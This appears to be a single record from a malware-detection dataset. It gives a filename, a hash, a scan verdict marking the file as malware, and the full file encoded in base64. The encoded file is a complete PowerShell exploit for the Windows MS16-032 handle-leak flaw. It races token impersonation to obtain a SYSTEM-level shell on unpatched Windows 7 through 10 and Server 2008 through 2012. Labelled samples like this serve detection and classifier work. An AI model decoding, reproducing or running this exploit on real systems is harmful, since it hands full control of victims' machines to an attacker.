Invoke-MS16-032.ps1,85003d7736ca999f85f07ac39d4e6f13,Scan result is 32768. IsMalware: 1,ZnVuY3Rpb24gSW52b2tlLU1TMTYtMDMyIHsKPCMKLlNZTk9QU0lTCiAgICAKICAgIFBvd2VyU2hlbGwgaW1wbGVtZW50YXRpb24gb2YgTVMxNi0wMzIuIFRoZSBleHBsb2l0IHRhcmdldHMgYWxsIHZ1bG5lcmFibGUKICAgIG9wZXJhdGluZyBzeXN0ZW1zIHRoYXQgc3VwcG9ydCBQb3dlclNoZWxsIHYyKy4gQ3JlZGl0IGZvciB0aGUgZGlzY292ZXJ5IG9mCiAgICB0aGUgYnVnIGFuZCB0aGUgbG9naWMgdG8gZXhwbG9pdCBpdCBnbyB0byBKYW1lcyBGb3JzaGF3IChAdGlyYW5pZGRvKS4KICAgIAogICAgVGFyZ2V0czoKICAgIAogICAgKiBXaW43LVdpbjEwICYgMms4LTJrMTIgPD09IDMyLzY0IGJpdCEKICAgICogVGVzdGVkIG9uIHgzMiBXaW43LCB4NjQgV2luOCwgeDY0IDJrMTJSMgogICAgCiAgICBOb3RlczoKICAgIAogICAgKiBJbiBvcmRlciBmb3IgdGhlIHJhY2UgY29uZGl0aW9uIHRvIHN1Y2NlZWQgdGhlIG1hY2hpbmUgbXVzdCBoYXZlIDIrIENQVQogICAgICBjb3Jlcy4gSWYgdGVzdGluZyBpbiBhIFZNIGp1c3QgbWFrZSBzdXJlIHRvIGFkZCBhIGNvcmUgaWYgbmVlZGVkIG1rYXkuCiAgICAqIFdhbnQgdG8ga25vdyBtb3JlIGFib3V0IE1TMTYtMDMyID09PgogICAgICBodHRwczovL2dvb2dsZXByb2plY3R6ZXJvLmJsb2dzcG90LmNvLnVrLzIwMTYvMDMvZXhwbG9pdGluZy1sZWFrZWQtdGhyZWFkLWhhbmRsZS5odG1sCgouREVTQ1JJUFRJT04KCUF1dGhvcjogUnViZW4gQm9vbmVuIChARnV6enlTZWMpCglCbG9nOiBodHRwOi8vd3d3LmZ1enp5c2VjdXJpdHkuY29tLwoJTGljZW5zZTogQlNEIDMtQ2xhdXNlCglSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IFBvd2VyU2hlbGwgdjIrCglPcHRpb25hbCBEZXBlbmRlbmNpZXM6IE5vbmUKICAgIAouRVhBTVBMRQoJQzpcUFM+IEludm9rZS1NUzE2LTAzMgojPgoJQWRkLVR5cGUgLVR5cGVEZWZpbml0aW9uIEAiCgl1c2luZyBTeXN0ZW07Cgl1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7Cgl1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7Cgl1c2luZyBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsOwoJCglbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCglwdWJsaWMgc3RydWN0IFBST0NFU1NfSU5GT1JNQVRJT04KCXsKCQlwdWJsaWMgSW50UHRyIGhQcm9jZXNzOwoJCXB1YmxpYyBJbnRQdHIgaFRocmVhZDsKCQlwdWJsaWMgaW50IGR3UHJvY2Vzc0lkOwoJCXB1YmxpYyBpbnQgZHdUaHJlYWRJZDsKCX0KCQoJW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQ9Q2hhclNldC5Vbmljb2RlKV0KCXB1YmxpYyBzdHJ1Y3QgU1RBUlRVUElORk8KCXsKCQlwdWJsaWMgSW50MzIgY2I7CgkJcHVibGljIHN0cmluZyBscFJlc2VydmVkOwoJCXB1YmxpYyBzdHJpbmcgbHBEZXNrdG9wOwoJCXB1YmxpYyBzdHJpbmcgbHBUaXRsZTsKCQlwdWJsaWMgSW50MzIgZHdYOwoJCXB1YmxpYyBJbnQzMiBkd1k7CgkJcHVibGljIEludDMyIGR3WFNpemU7CgkJcHVibGljIEludDMyIGR3WVNpemU7CgkJcHVibGljIEludDMyIGR3WENvdW50Q2hhcnM7CgkJcHVibGljIEludDMyIGR3WUNvdW50Q2hhcnM7CgkJcHVibGljIEludDMyIGR3RmlsbEF0dHJpYnV0ZTsKCQlwdWJsaWMgSW50MzIgZHdGbGFnczsKCQlwdWJsaWMgSW50MTYgd1Nob3dXaW5kb3c7CgkJcHVibGljIEludDE2IGNiUmVzZXJ2ZWQyOwoJCXB1YmxpYyBJbnRQdHIgbHBSZXNlcnZlZDI7CgkJcHVibGljIEludFB0ciBoU3RkSW5wdXQ7CgkJcHVibGljIEludFB0ciBoU3RkT3V0cHV0OwoJCXB1YmxpYyBJbnRQdHIgaFN0ZEVycm9yOwoJfQoJCglbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCglwdWJsaWMgc3RydWN0IFNRT1MKCXsKCQlwdWJsaWMgaW50IExlbmd0aDsKCQlwdWJsaWMgaW50IEltcGVyc29uYXRpb25MZXZlbDsKCQlwdWJsaWMgaW50IENvbnRleHRUcmFja2luZ01vZGU7CgkJcHVibGljIGJvb2wgRWZmZWN0aXZlT25seTsKCX0KCQoJcHVibGljIHN0YXRpYyBjbGFzcyBBZHZhcGkzMgoJewoJCVtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlLCBDaGFyU2V0PUNoYXJTZXQuVW5pY29kZSldCgkJcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBDcmVhdGVQcm9jZXNzV2l0aExvZ29uVygKCQkJU3RyaW5nIHVzZXJOYW1lLAoJCQlTdHJpbmcgZG9tYWluLAoJCQlTdHJpbmcgcGFzc3dvcmQsCgkJCWludCBsb2dvbkZsYWdzLAoJCQlTdHJpbmcgYXBwbGljYXRpb25OYW1lLAoJCQlTdHJpbmcgY29tbWFuZExpbmUsCgkJCWludCBjcmVhdGlvbkZsYWdzLAoJCQlpbnQgZW52aXJvbm1lbnQsCgkJCVN0cmluZyBjdXJyZW50RGlyZWN0b3J5LAoJCQlyZWYgIFNUQVJUVVBJTkZPIHN0YXJ0dXBJbmZvLAoJCQlvdXQgUFJPQ0VTU19JTkZPUk1BVElPTiBwcm9jZXNzSW5mb3JtYXRpb24pOwoJCQkKCQlbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCgkJcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTZXRUaHJlYWRUb2tlbigKCQkJcmVmIEludFB0ciBUaHJlYWQsCgkJCUludFB0ciBUb2tlbik7CgkJCQoJCVtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KCQlwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIE9wZW5UaHJlYWRUb2tlbigKCQkJSW50UHRyIFRocmVhZEhhbmRsZSwKCQkJaW50IERlc2lyZWRBY2Nlc3MsCgkJCWJvb2wgT3BlbkFzU2VsZiwKCQkJb3V0IEludFB0ciBUb2tlbkhhbmRsZSk7CgkJCQoJCVtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KCQlwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIE9wZW5Qcm9jZXNzVG9rZW4oCgkJCUludFB0ciBQcm9jZXNzSGFuZGxlLCAKCQkJaW50IERlc2lyZWRBY2Nlc3MsCgkJCXJlZiBJbnRQdHIgVG9rZW5IYW5kbGUpOwoJCQkKCQlbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCgkJcHVibGljIGV4dGVybiBzdGF0aWMgYm9vbCBEdXBsaWNhdGVUb2tlbigKCQkJSW50UHRyIEV4aXN0aW5nVG9rZW5IYW5kbGUsCgkJCWludCBTRUNVUklUWV9JTVBFUlNPTkFUSU9OX0xFVkVMLAoJCQlyZWYgSW50UHRyIER1cGxpY2F0ZVRva2VuSGFuZGxlKTsKCX0KCQoJcHVibGljIHN0YXRpYyBjbGFzcyBLZXJuZWwzMgoJewoJCVtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQoJCXB1YmxpYyBzdGF0aWMgZXh0ZXJuIHVpbnQgR2V0TGFzdEVycm9yKCk7CgkKCQlbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCgkJcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEN1cnJlbnRQcm9jZXNzKCk7CgkKCQlbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCgkJcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEN1cnJlbnRUaHJlYWQoKTsKCQkKCQlbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCgkJcHVibGljIHN0YXRpYyBleHRlcm4gaW50IEdldFRocmVhZElkKEludFB0ciBoVGhyZWFkKTsKCQkKCQlbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KCQlwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgR2V0UHJvY2Vzc0lkT2ZUaHJlYWQoSW50UHRyIGhhbmRsZSk7CgkJCgkJW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIixTZXRMYXN0RXJyb3I9dHJ1ZSldCgkJcHVibGljIHN0YXRpYyBleHRlcm4gaW50IFN1c3BlbmRUaHJlYWQoSW50UHRyIGhUaHJlYWQpOwoJCQoJCVtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsU2V0TGFzdEVycm9yPXRydWUpXQoJCXB1YmxpYyBzdGF0aWMgZXh0ZXJuIGludCBSZXN1bWVUaHJlYWQoSW50UHRyIGhUaHJlYWQpOwoJCQoJCVtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KCQlwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFRlcm1pbmF0ZVByb2Nlc3MoCgkJCUludFB0ciBoUHJvY2VzcywKCQkJdWludCB1RXhpdENvZGUpOwoJCgkJW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yPXRydWUpXQoJCXB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgQ2xvc2VIYW5kbGUoSW50UHRyIGhPYmplY3QpOwoJCQoJCVtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KCQlwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIER1cGxpY2F0ZUhhbmRsZSgKCQkJSW50UHRyIGhTb3VyY2VQcm9jZXNzSGFuZGxlLAoJCQlJbnRQdHIgaFNvdXJjZUhhbmRsZSwKCQkJSW50UHRyIGhUYXJnZXRQcm9jZXNzSGFuZGxlLAoJCQlyZWYgSW50UHRyIGxwVGFyZ2V0SGFuZGxlLAoJCQlpbnQgZHdEZXNpcmVkQWNjZXNzLAoJCQlib29sIGJJbmhlcml0SGFuZGxlLAoJCQlpbnQgZHdPcHRpb25zKTsKCX0KCQoJcHVibGljIHN0YXRpYyBjbGFzcyBOdGRsbAoJewoJCVtEbGxJbXBvcnQoIm50ZGxsLmRsbCIsIFNldExhc3RFcnJvcj10cnVlKV0KCQlwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgTnRJbXBlcnNvbmF0ZVRocmVhZCgKCQkJSW50UHRyIFRocmVhZEhhbmRsZSwKCQkJSW50UHRyIFRocmVhZFRvSW1wZXJzb25hdGUsCgkJCXJlZiBTUU9TIFNlY3VyaXR5UXVhbGl0eU9mU2VydmljZSk7Cgl9CiJACgkKCWZ1bmN0aW9uIEdldC1UaHJlYWRIYW5kbGUgewoJCSMgU3RhcnR1cEluZm8gU3RydWN0CgkJJFN0YXJ0dXBJbmZvID0gTmV3LU9iamVjdCBTVEFSVFVQSU5GTwoJCSRTdGFydHVwSW5mby5kd0ZsYWdzID0gMHgwMDAwMDEwMCAjIFNUQVJURl9VU0VTVERIQU5ETEVTCgkJJFN0YXJ0dXBJbmZvLmhTdGRJbnB1dCA9IFtLZXJuZWwzMl06OkdldEN1cnJlbnRUaHJlYWQoKQoJCSRTdGFydHVwSW5mby5oU3RkT3V0cHV0ID0gW0tlcm5lbDMyXTo6R2V0Q3VycmVudFRocmVhZCgpCgkJJFN0YXJ0dXBJbmZvLmhTdGRFcnJvciA9IFtLZXJuZWwzMl06OkdldEN1cnJlbnRUaHJlYWQoKQoJCSRTdGFydHVwSW5mby5jYiA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZigkU3RhcnR1cEluZm8pICMgU3RydWN0IFNpemUKCQkKCQkjIFByb2Nlc3NJbmZvIFN0cnVjdAoJCSRQcm9jZXNzSW5mbyA9IE5ldy1PYmplY3QgUFJPQ0VTU19JTkZPUk1BVElPTgoJCQoJCSMgQ3JlYXRlUHJvY2Vzc1dpdGhMb2dvblcgLS0+IGxwQ3VycmVudERpcmVjdG9yeQoJCSRHZXRDdXJyZW50UGF0aCA9IChHZXQtSXRlbSAtUGF0aCAiLlwiIC1WZXJib3NlKS5GdWxsTmFtZQoJCQoJCSMgTE9HT05fTkVUQ1JFREVOVElBTFNfT05MWSAvIENSRUFURV9TVVNQRU5ERUQKCQkkQ2FsbFJlc3VsdCA9IFtBZHZhcGkzMl06OkNyZWF0ZVByb2Nlc3NXaXRoTG9nb25XKAoJCQkidXNlciIsICJkb21haW4iLCAicGFzcyIsCgkJCTB4MDAwMDAwMDIsICJDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUiLCAiIiwKCQkJMHgwMDAwMDAwNCwgJG51bGwsICRHZXRDdXJyZW50UGF0aCwKCQkJW3JlZl0kU3RhcnR1cEluZm8sIFtyZWZdJFByb2Nlc3NJbmZvKQoJCQoJCSMgRHVwbGljYXRlIGhhbmRsZSBpbnRvIGN1cnJlbnQgcHJvY2VzcyAtPiBEVVBMSUNBVEVfU0FNRV9BQ0NFU1MKCQkkbHBUYXJnZXRIYW5kbGUgPSBbSW50UHRyXTo6WmVybwoJCSRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6RHVwbGljYXRlSGFuZGxlKAoJCQkkUHJvY2Vzc0luZm8uaFByb2Nlc3MsIDB4NCwKCQkJW0tlcm5lbDMyXTo6R2V0Q3VycmVudFByb2Nlc3MoKSwKCQkJW3JlZl0kbHBUYXJnZXRIYW5kbGUsIDAsICRmYWxzZSwKCQkJMHgwMDAwMDAwMikKCQkKCQkjIENsZWFuIHVwIHN1c3BlbmRlZCBwcm9jZXNzCgkJJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpUZXJtaW5hdGVQcm9jZXNzKCRQcm9jZXNzSW5mby5oUHJvY2VzcywgMSkKCQkkQ2FsbFJlc3VsdCA9IFtLZXJuZWwzMl06OkNsb3NlSGFuZGxlKCRQcm9jZXNzSW5mby5oUHJvY2VzcykKCQkkQ2FsbFJlc3VsdCA9IFtLZXJuZWwzMl06OkNsb3NlSGFuZGxlKCRQcm9jZXNzSW5mby5oVGhyZWFkKQoJCQoJCSRscFRhcmdldEhhbmRsZQoJfQoJCglmdW5jdGlvbiBHZXQtU3lzdGVtVG9rZW4gewoJCWVjaG8gImBuWz9dIFRocmVhZCBiZWxvbmdzIHRvOiAkKCQoR2V0LVByb2Nlc3MgLVBJRCAkKFtLZXJuZWwzMl06OkdldFByb2Nlc3NJZE9mVGhyZWFkKCRoVGhyZWFkKSkpLlByb2Nlc3NOYW1lKSIKCQoJCSRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6U3VzcGVuZFRocmVhZCgkaFRocmVhZCkKCQlpZiAoJENhbGxSZXN1bHQgLW5lIDApIHsKCQkJZWNobyAiWyFdICRoVGhyZWFkIGlzIGEgYmFkIHRocmVhZCwgZXhpdGluZy4uIgoJCQlSZXR1cm4KCQl9IGVjaG8gIlsrXSBUaHJlYWQgc3VzcGVuZGVkIgoJCQoJCWVjaG8gIls+XSBXaXBpbmcgY3VycmVudCBpbXBlcnNvbmF0aW9uIHRva2VuIgoJCSRDYWxsUmVzdWx0ID0gW0FkdmFwaTMyXTo6U2V0VGhyZWFkVG9rZW4oW3JlZl0kaFRocmVhZCwgW0ludFB0cl06Olplcm8pCgkJaWYgKCEkQ2FsbFJlc3VsdCkgewoJCQllY2hvICJbIV0gU2V0VGhyZWFkVG9rZW4gZmFpbGVkLCBleGl0aW5nLi4iCgkJCSRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6UmVzdW1lVGhyZWFkKCRoVGhyZWFkKQoJCQllY2hvICJbK10gVGhyZWFkIHJlc3VtZWQhIgoJCQlSZXR1cm4KCQl9CgkJCgkJZWNobyAiWz5dIEJ1aWxkaW5nIFNZU1RFTSBpbXBlcnNvbmF0aW9uIHRva2VuIgoJCSMgU2VjdXJpdHlRdWFsaXR5T2ZTZXJ2aWNlIHN0cnVjdAoJCSRTUU9TID0gTmV3LU9iamVjdCBTUU9TCgkJJFNRT1MuSW1wZXJzb25hdGlvbkxldmVsID0gMiAjU2VjdXJpdHlJbXBlcnNvbmF0aW9uCgkJJFNRT1MuTGVuZ3RoID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKCRTUU9TKQoJCSMgVW5kb2N1bWVudGVkIEFQSSdzLCBJIGxpa2UgeW91ciBzdHlsZSBNaWNyb3NvZnQgOykKCQkkQ2FsbFJlc3VsdCA9IFtOdGRsbF06Ok50SW1wZXJzb25hdGVUaHJlYWQoJGhUaHJlYWQsICRoVGhyZWFkLCBbcmVmXSRzcW9zKQoJCWlmICgkQ2FsbFJlc3VsdCAtbmUgMCkgewoJCQllY2hvICJbIV0gTnRJbXBlcnNvbmF0ZVRocmVhZCBmYWlsZWQsIGV4aXRpbmcuLiIKCQkJJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpSZXN1bWVUaHJlYWQoJGhUaHJlYWQpCgkJCWVjaG8gIlsrXSBUaHJlYWQgcmVzdW1lZCEiCgkJCVJldHVybgoJCX0KCQkKCQkjIE51bGwgJFN5c1Rva2VuSGFuZGxlCgkJJHNjcmlwdDpTeXNUb2tlbkhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCgoJCSMgMHgwMDA2IC0tPiBUT0tFTl9EVVBMSUNBVEUgLWJvciBUT0tFTl9JTVBFUlNPTkFURQoJCSRDYWxsUmVzdWx0ID0gW0FkdmFwaTMyXTo6T3BlblRocmVhZFRva2VuKCRoVGhyZWFkLCAweDAwMDYsICRmYWxzZSwgW3JlZl0kU3lzVG9rZW5IYW5kbGUpCgkJaWYgKCEkQ2FsbFJlc3VsdCkgewoJCQllY2hvICJbIV0gT3BlblRocmVhZFRva2VuIGZhaWxlZCwgZXhpdGluZy4uIgoJCQkkQ2FsbFJlc3VsdCA9IFtLZXJuZWwzMl06OlJlc3VtZVRocmVhZCgkaFRocmVhZCkKCQkJZWNobyAiWytdIFRocmVhZCByZXN1bWVkISIKCQkJUmV0dXJuCgkJfQoJCQoJCWVjaG8gIls/XSBTdWNjZXNzLCBvcGVuIFNZU1RFTSB0b2tlbiBoYW5kbGU6ICRTeXNUb2tlbkhhbmRsZSIKCQllY2hvICJbK10gUmVzdW1pbmcgdGhyZWFkLi4iCgkJJENhbGxSZXN1bHQgPSBbS2VybmVsMzJdOjpSZXN1bWVUaHJlYWQoJGhUaHJlYWQpCgl9CgkKCSMgbWFpbigpIDwtLS0gOykKCSRtczE2MDMyID0gQCIKCSBfXyBfXyBfX18gX19fICAgX19fICAgICBfX18gX19fIF9fXyAKCXwgIFYgIHwgIF98XyAgfCB8ICBffF9fX3wgICB8XyAgfF8gIHwKCXwgICAgIHxfICB8X3wgfF98IC4gfF9fX3wgfCB8XyAgfCAgX3wKCXxffF98X3xfX198X19fX198X19ffCAgIHxfX198X19ffF9fX3wKCSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoJICAgICAgICAgICAgICAgW2J5IGIzM2YgLT4gQEZ1enp5U2VjXQoiQAoJCgkkbXMxNjAzMgoJCgkjIENoZWNrIGxvZ2ljYWwgcHJvY2Vzc29yIGNvdW50LCByYWNlIGNvbmRpdGlvbiByZXF1aXJlcyAyKwoJZWNobyAiYG5bP10gT3BlcmF0aW5nIHN5c3RlbSBjb3JlIGNvdW50OiAkKFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpQcm9jZXNzb3JDb3VudCkiCglpZiAoJChbU3lzdGVtLkVudmlyb25tZW50XTo6UHJvY2Vzc29yQ291bnQpIC1sdCAyKSB7CgkJZWNobyAiWyFdIFRoaXMgaXMgYSBWTSBpc24ndCBpdCwgcmFjZSBjb25kaXRpb24gcmVxdWlyZXMgYXQgbGVhc3QgMiBDUFUgY29yZXMsIGV4aXRpbmchYG4iCgkJUmV0dXJuCgl9CgkKCWVjaG8gIls+XSBEdXBsaWNhdGluZyBDcmVhdGVQcm9jZXNzV2l0aExvZ29uVyBoYW5kbGUiCgkkaFRocmVhZCA9IEdldC1UaHJlYWRIYW5kbGUKCQoJIyBJZiBubyB0aHJlYWQgaGFuZGxlIGlzIGNhcHR1cmVkLCB0aGUgYm94IGlzIHBhdGNoZWQKCWlmICgkaFRocmVhZCAtZXEgMCkgewoJCWVjaG8gIlshXSBObyB2YWxpZCB0aHJlYWQgaGFuZGxlIHdhcyBjYXB0dXJlZCwgZXhpdGluZyFgbiIKCQlSZXR1cm4KCX0gZWxzZSB7CgkJZWNobyAiWz9dIERvbmUsIHVzaW5nIHRocmVhZCBoYW5kbGU6ICRoVGhyZWFkIgoJfSBlY2hvICJgblsqXSBTbmlmZmluZyBvdXQgcHJpdmlsZWdlZCBpbXBlcnNvbmF0aW9uIHRva2VuLi4iCgkKCSMgR2V0IGhhbmRsZSB0byBTWVNURU0gYWNjZXNzIHRva2VuCglHZXQtU3lzdGVtVG9rZW4KCQoJIyBJZiB3ZSBmYWlsIGEgY2hlY2sgaW4gR2V0LVN5c3RlbVRva2VuLCBleGl0CglpZiAoJFN5c1Rva2VuSGFuZGxlIC1lcSAwKSB7CgkJUmV0dXJuCgl9CgkKCWVjaG8gImBuWypdIFNuaWZmaW5nIG91dCBTWVNURU0gc2hlbGwuLiIKCWVjaG8gImBuWz5dIER1cGxpY2F0aW5nIFNZU1RFTSB0b2tlbiIKCSRoRHVwbGljYXRlVG9rZW5IYW5kbGUgPSBbSW50UHRyXTo6WmVybwoJJENhbGxSZXN1bHQgPSBbQWR2YXBpMzJdOjpEdXBsaWNhdGVUb2tlbigkU3lzVG9rZW5IYW5kbGUsIDIsIFtyZWZdJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSkKCQoJIyBTaW1wbGUgUFMgcnVuc3BhY2UgZGVmaW5pdGlvbgoJZWNobyAiWz5dIFN0YXJ0aW5nIHRva2VuIHJhY2UiCgkkUnVuc3BhY2UgPSBbcnVuc3BhY2VmYWN0b3J5XTo6Q3JlYXRlUnVuc3BhY2UoKQoJJFN0YXJ0VG9rZW5SYWNlID0gW3Bvd2Vyc2hlbGxdOjpDcmVhdGUoKQoJJFN0YXJ0VG9rZW5SYWNlLnJ1bnNwYWNlID0gJFJ1bnNwYWNlCgkkUnVuc3BhY2UuT3BlbigpCglbdm9pZF0kU3RhcnRUb2tlblJhY2UuQWRkU2NyaXB0KHsKCQlQYXJhbSAoJGhUaHJlYWQsICRoRHVwbGljYXRlVG9rZW5IYW5kbGUpCgkJd2hpbGUgKCR0cnVlKSB7CgkJCSRDYWxsUmVzdWx0ID0gW0FkdmFwaTMyXTo6U2V0VGhyZWFkVG9rZW4oW3JlZl0kaFRocmVhZCwgJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSkKCQl9Cgl9KS5BZGRBcmd1bWVudCgkaFRocmVhZCkuQWRkQXJndW1lbnQoJGhEdXBsaWNhdGVUb2tlbkhhbmRsZSkKCSRBc2NPYmogPSAkU3RhcnRUb2tlblJhY2UuQmVnaW5JbnZva2UoKQoJCgllY2hvICJbPl0gU3RhcnRpbmcgcHJvY2VzcyByYWNlIgoJIyBBZGRpbmcgYSB0aW1lb3V0ICgxMCBzZWNvbmRzKSBoZXJlIHRvIHNhZmVndWFyZCBmcm9tIGVkZ2UtY2FzZXMKCSRTYWZlR3VhcmQgPSBbZGlhZ25vc3RpY3Muc3RvcHdhdGNoXTo6U3RhcnROZXcoKQoJd2hpbGUgKCRTYWZlR3VhcmQuRWxhcHNlZE1pbGxpc2Vjb25kcyAtbHQgMTAwMDApIHsKCgkJIyBTdGFydHVwSW5mbyBTdHJ1Y3QKCQkkU3RhcnR1cEluZm8gPSBOZXctT2JqZWN0IFNUQVJUVVBJTkZPCgkJJFN0YXJ0dXBJbmZvLmNiID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKCRTdGFydHVwSW5mbykgIyBTdHJ1Y3QgU2l6ZQoJCQoJCSMgUHJvY2Vzc0luZm8gU3RydWN0CgkJJFByb2Nlc3NJbmZvID0gTmV3LU9iamVjdCBQUk9DRVNTX0lORk9STUFUSU9OCgkJCgkJIyBDcmVhdGVQcm9jZXNzV2l0aExvZ29uVyAtLT4gbHBDdXJyZW50RGlyZWN0b3J5CgkJJEdldEN1cnJlbnRQYXRoID0gKEdldC1JdGVtIC1QYXRoICIuXCIgLVZlcmJvc2UpLkZ1bGxOYW1lCgkJCgkJIyBMT0dPTl9ORVRDUkVERU5USUFMU19PTkxZIC8gQ1JFQVRFX1NVU1BFTkRFRAoJCSRDYWxsUmVzdWx0ID0gW0FkdmFwaTMyXTo6Q3JlYXRlUHJvY2Vzc1dpdGhMb2dvblcoCgkJCSJ1c2VyIiwgImRvbWFpbiIsICJwYXNzIiwKCQkJMHgwMDAwMDAwMiwgIkM6XFdpbmRvd3NcU3lzdGVtMzJcY21kLmV4ZSIsICIiLAoJCQkweDAwMDAwMDA0LCAkbnVsbCwgJEdldEN1cnJlbnRQYXRoLAoJCQlbcmVmXSRTdGFydHVwSW5mbywgW3JlZl0kUHJvY2Vzc0luZm8pCgkJCgkJIy0tLQoJCSMgTWFrZSBzdXJlIENyZWF0ZVByb2Nlc3NXaXRoTG9nb25XIHJhbiBzdWNjZXNzZnVsbHkhIElmIG5vdCwgc2tpcCBsb29wLgoJCSMtLS0KCQkjIE1pc3NpbmcgdGhpcyBjaGVjayB1c2VkIHRvIGNhdXNlIHRoZSBleHBsb2l0IHRvIGZhaWwgc29tZXRpbWVzLgoJCSMgSWYgQ3JlYXRlUHJvY2Vzc1dpdGhMb2dvbiBmYWlscyBPcGVuUHJvY2Vzc1Rva2VuIHdvbid0IHN1Y2NlZWQKCQkjIGJ1dCB3ZSBvYnZpb3VzbHkgZG9uJ3QgaGF2ZSBhIFNZU1RFTSBzaGVsbCA6JyggLiBTaG91bGQgYmUgMTAwJQoJCSMgcmVsaWFibGUgbm93IQoJCSMtLS0KCQlpZiAoISRDYWxsUmVzdWx0KSB7CgkJCWNvbnRpbnVlCgkJfQoJCQkKCQkkaFRva2VuSGFuZGxlID0gW0ludFB0cl06Olplcm8KCQkkQ2FsbFJlc3VsdCA9IFtBZHZhcGkzMl06Ok9wZW5Qcm9jZXNzVG9rZW4oJFByb2Nlc3NJbmZvLmhQcm9jZXNzLCAweDI4LCBbcmVmXSRoVG9rZW5IYW5kbGUpCgkJIyBJZiB3ZSBjYW4ndCBvcGVuIHRoZSBwcm9jZXNzIHRva2VuIGl0J3MgYSBTWVNURU0gc2hlbGwhCgkJaWYgKCEkQ2FsbFJlc3VsdCkgewoJCQllY2hvICJbIV0gSG9seSBoYW5kbGUgbGVhayBCYXRtYW4sIHdlIGhhdmUgYSBTWVNURU0gc2hlbGwhIWBuIgoJCQkkQ2FsbFJlc3VsdCA9IFtLZXJuZWwzMl06OlJlc3VtZVRocmVhZCgkUHJvY2Vzc0luZm8uaFRocmVhZCkKCQkJJFN0YXJ0VG9rZW5SYWNlLlN0b3AoKQoJCQkkU2FmZUd1YXJkLlN0b3AoKQoJCQlSZXR1cm4KCQl9CgkJCQoJCSMgQ2xlYW4gdXAgc3VzcGVuZGVkIHByb2Nlc3MKCQkkQ2FsbFJlc3VsdCA9IFtLZXJuZWwzMl06OlRlcm1pbmF0ZVByb2Nlc3MoJFByb2Nlc3NJbmZvLmhQcm9jZXNzLCAxKQoJCSRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6Q2xvc2VIYW5kbGUoJFByb2Nlc3NJbmZvLmhQcm9jZXNzKQoJCSRDYWxsUmVzdWx0ID0gW0tlcm5lbDMyXTo6Q2xvc2VIYW5kbGUoJFByb2Nlc3NJbmZvLmhUaHJlYWQpCgoJfQoJCgkjIEtpbGwgcnVuc3BhY2UgJiBzdG9wd2F0Y2ggaWYgZWRnZS1jYXNlCgkkU3RhcnRUb2tlblJhY2UuU3RvcCgpCgkkU2FmZUd1YXJkLlN0b3AoKQp9Cg==
